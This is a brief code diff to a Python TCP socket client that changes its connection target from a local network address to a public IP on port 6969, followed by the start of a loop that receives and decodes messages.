@@ -1,7 +1,7 @@
 import socket
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(('192.168.0.7', 6969))
+s.connect(('117.98.141.209', 6969))
 try:
     while True:
         msg = s.recv(1024).decode('utf-8')
